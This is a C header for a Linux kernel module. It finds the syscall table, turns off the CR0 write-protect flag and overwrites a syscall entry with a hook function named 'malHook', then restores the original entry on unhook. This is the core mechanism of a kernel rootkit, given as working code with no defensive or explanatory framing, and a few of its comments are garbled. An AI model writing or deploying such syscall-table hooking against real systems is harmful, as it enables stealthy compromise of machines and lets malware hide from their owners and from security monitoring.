
#pragma once
#include "pch.h"
#include "utils64.h"
 

static struct hookInfo
{
    unsigned short      processor;      /* the current processor number on which the hook is executes */ 
    void**              sstb;           /* syscall base address */ 
    unsigned int        nr;             /* syscall number __NR_* */ 
    unsigned long       hookFunc;       /* our hook address */ 
    unsigned long       originalFunc;   /* original hook address */
}; 

/* stores hook related information */ 
static struct hookInfo hi; 

/* original system call handler */ 
inline unsigned long hook_syscall_x64(unsigned long malHook, unsigned int sysNumber)
{
    hi.sstb = dumpAddr("sys_call_table");       /* syscall table base address */ 
    hi.processor = smp_processor_id();          /* executing processor */ 
    hi.originalFunc = hi.sstb[sysNumber];       /* extracting the target syscall */ 
    hi.hookFunc = malHook;                      /* hook address */ 
    hi.nr = sysNumber;                          /* system call number */


    wpOFF();                        /* masking CR0 wp flag */ 
    hi.sstb[hi.nr] = malHook;       /* overwriting entry in the system call table */ 
    wpON();                         /* wp on */ 
    return hi.originalFunc;
}

inline void unhook_syscall_x64(void)
{
    wpOFF(); 
    hi.sstb[hi.nr] = hi.originalFunc;  
    wpON(); 

}


